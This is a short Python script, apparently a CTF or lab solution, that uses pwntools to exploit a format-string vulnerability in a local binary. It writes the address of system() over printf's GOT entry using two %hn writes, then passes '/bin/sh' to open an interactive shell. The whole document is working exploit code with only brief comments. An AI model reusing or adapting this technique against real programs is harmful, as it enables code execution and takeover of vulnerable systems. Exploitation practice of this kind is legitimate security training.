from pwn import *

p = process("./out");

#system address
val = 0xf7e0c830
#printf got address
address = 0x804c00c
#relative place in stack where given arguments appear
stack_num = 4

buf = p32(address)
buf += p32(address+2)

#take 4 last bytes
lsb = val & 0xffff
#take 4 first bytes
msb = val >> 16

#number of bytes to write before hn
count = lsb - len(buf)

#change 2 LS bytes
buf += "%" + str(count) + "x%" + str(stack_num) + "$hn"

#check if msb  must be extended
if msb>lsb:
    count = msb-lsb
else:
    count = (msb | 0x10000) - lsb

#change 2 MS bytes
buf += "%" + str(count) + "x%" + str(stack_num+1) + "$hn"

#gdb.attach(p)
p.sendline(buf)
p.sendline("/bin/sh")
p.interactive()
